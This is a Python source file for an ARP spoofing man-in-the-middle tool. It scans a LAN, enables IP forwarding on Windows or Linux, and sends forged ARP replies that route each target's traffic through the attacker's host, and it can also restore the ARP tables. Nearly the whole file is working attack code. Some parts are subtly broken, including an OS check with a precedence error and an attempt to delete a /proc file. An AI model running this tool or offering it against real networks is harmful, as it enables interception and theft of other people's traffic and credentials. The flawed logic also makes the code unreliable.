"""
Copyright (C) 2020 Tyrone Westall

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see <https://www.gnu.org/licenses/>.
"""

# ARP MITM - Windows Version
# This tool will start by requesting details of the Router IP, network address and the subnet mask. It will then conduct
# a syn scan on the network and find out which hosts are alive. Once a target list has been generated the program will
# send an ARP broadcast on the local network, and the machine running the program will (hopefully) act as the
# default gateway for the network, forwarding traffic to the real default gateway.

import sys
import os
import platform
from scapy.all import *
from netscanner import netscan_main

# Define text colours
B, R, Y, G, M, N = '\33[94m', '\033[91m', '\33[93m', '\033[1;32m', '\033[1;35m', '\033[0m'


class arp_mitm:
    def __init__(self, target, rtrip, atkopt, timeout=1, pktintr=0.1):
        self.target = target
        self.rtrip = rtrip
        self.atkopt = atkopt
        self.timeout = timeout
        self.pktintr = float(pktintr)
        self.rtrmac = ""
        self.tgt_list = {}

    def find_targets(self):
        netscan = netscan_main.netscanner(1, self.target, timeout=self.timeout, pktintr=self.pktintr, inc_mac=1)
        self.tgt_list = netscan.init_scan()
        if self.tgt_list == False:
            print("{0}[*] No targets found via ARP scan. Exiting...".format(R))
            return False
        for key, value in self.tgt_list.items():
            if self.rtrip in value:
                self.rtrmac = self.tgt_list[key].split('-')
                self.rtrmac = self.rtrmac[1]
                self.tgt_list.pop(key)
                print("{0}[*] Router %s removed from target list".format(B) % self.rtrip)
                if len(self.tgt_list) == 0:
                    print("{0}[*] No valid targets remaining. Exiting...".format(R))
                    return False
                else:
                    if self.atkopt == 0:
                        self.start_arp_mitm()
                    else:
                        self.stop_arp_mitm()
            else:
                print("{0}[*] Specified router not found. Exiting program...".format(R))
                return False

    def start_arp_mitm(self):
        print("{0}[*] Starting ARP MITM attack...".format(N))
        #Get OS name
        osname = os.name
        osver = platform.release()
        if osname == 'nt' and osver == '7' or osver == '8' or osver == '8.1' or osver == '10':
            #Check IP Routing service. If the service is not running, start it
            iprouting_query = ['sc', 'query', 'RemoteAccess']
            cmd_result = subprocess.Popen(iprouting_query, stdout=subprocess.PIPE)
            cmd_result = cmd_result.stdout.read()
            if b"STOPPED" in cmd_result:
                iprouting_start = ['sc', 'start', 'RemoteAccess']
                cmd_result = subprocess.Popen(iprouting_start, stdout=subprocess.PIPE)
                print("{0}[*] Starting Routing and Remote Access Service...".format(B))
                time.sleep(3)
                cmd_result = subprocess.Popen(iprouting_query, stdout=subprocess.PIPE)
                cmd_result = cmd_result.stdout.read()
                if b"STARTED" in cmd_result:
                    print("{0}[*] Routing and Remote Access Service started, continuing...".format(G))
                elif b"STARTING" in cmd_result:
                    while b"STARTING" in cmd_result:
                        time.sleep(2)
                        cmd_result = subprocess.Popen(iprouting_query, stdout=subprocess.PIPE)
                        cmd_result = cmd_result.stdout.read()
                        if b"STARTED" in cmd_result:
                            print("{0}[*] Routing and Remote Access Service started, continuing...".format(G))
                            break
                else:
                    print("{0}Unable to start Routing and Remote Access Service, exiting...".format(R))
                    return False
            elif b"STARTED" in cmd_result:
                print("{0}[*] Routing and Remote Access Service started, continuing...".format(G))
        if osname == 'linux':
            #Enable IP Forwarding
            ipforward_file = "/proc/sys/net/ipv4/ip_forward"
            f = open(ipforward_file, "r")
            result = f.read()
            if result == "1":
                print("{0}[*] IP Forwarding already started, continuing...".format(G))
                f.close()
            elif result is not "1":
                if result is "0" or not "":
                    os.remove(ipforward_file)
                    f = open(ipforward_file, "w")
                print("{0}[*] Starting IP Forwarding...".format(B))
                f.write("1")
                print("{0}[*] IP Forwarding started, file {1} modified. Continuing...".format(G, ipforward_file))
                f.close()
        try:
            for i in self.tgt_list:
                result = self.tgt_list[i].split('-')
                send(ARP(op=2, pdst=result[1], psrc=self.rtrip, hwdst=result[0]), count=1, verbose=0)
                send(ARP(op=2, pdst=self.rtrip, psrc=result[1], hwdst=self.rtrmac), count=1, verbose=0)
                print("{0}[*] Target %s poisoned".format(G) % result[1])
        except Exception:
            print("{0}[*] Unable to poison target %s".format(R) % result[1])

    def stop_arp_mitm(self):
        print("{0}[*] Stopping ARP MITM attack...".format(N))
        try:
            for i in self.tgt_list:
                result = self.tgt_list[i].split('-')
                send(ARP(op=2, pdst=result[1], psrc=self.rtrip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=self.rtrmac), verbose=0, count=5)
                send(ARP(op=2, pdst=self.rtrip, psrc=result[1], hwdst=self.rtrmac, hwsrc=result[0]), verbose=0, count=5)
                print("{0}[*]Target %s restored".format(G) % result[1])
        except Exception:
            print("{0}[*] Unable to restore target %s".format(R) % result[1])

        osname = os.name
        osver = platform.release()
        if osname == 'nt' and osver == '7' or osver == '8' or osver == '8.1' or osver == '10':
            # Stop the IP Routing service
            iprouting_query = ['sc', 'query', 'RemoteAccess']
            cmd_result = subprocess.Popen(iprouting_query, stdout=subprocess.PIPE)
            cmd_result = cmd_result.stdout.read()
            if b"STARTED" in cmd_result:
                iprouting_stop = ['sc', 'stop', 'RemoteAccess']
                cmd_result = subprocess.Popen(iprouting_stop, stdout=subprocess.PIPE)
                print("{0}[*] Stopping Routing and Remote Access Service...".format(B))
                time.sleep(3)
                cmd_result = subprocess.Popen(iprouting_query, stdout=subprocess.PIPE)
                cmd_result = cmd_result.stdout.read()
                if b"STOPPED" in cmd_result:
                    print("{0}[*] Routing and Remote Access Service stopped.".format(G))
                elif b"STOPPING" in cmd_result:
                    while b"STOPPING" in cmd_result:
                        time.sleep(2)
                        cmd_result = subprocess.Popen(iprouting_query, stdout=subprocess.PIPE)
                        cmd_result = cmd_result.stdout.read()
                        if b"STOPPED" in cmd_result:
                            print("{0}[*] Routing and Remote Access Service stopped.".format(G))
                            break
                else:
                    print("{0}Unable to stop Routing and Remote Access Service, please manually stop it in Services.".format(R))
                    return False
            elif b"STOPPED" in cmd_result:
                print("{0}[*] Routing and Remote Access Service stopped.".format(G))
        if osname == 'linux':
            # Disable IP Forwarding
            ipforward_file = "/proc/sys/net/ipv4/ip_forward"
            f = open(ipforward_file, "r")
            result = f.read()
            if result == "0":
                print("{0}[*] IP Forwarding stopped.".format(G))
                f.close()
            elif result is not "0":
                if result is "1" or not "":
                    os.remove(ipforward_file)
                    f = open(ipforward_file, "w")
                print("{0}[*] Starting IP Forwarding...".format(B))
                f.write("0")
                print("{0}[*] IP Forwarding stopped, file {1} modified.".format(G, ipforward_file))
                f.close()

        print("{0}[*] Targets restored. Exiting...".format(G))
        return False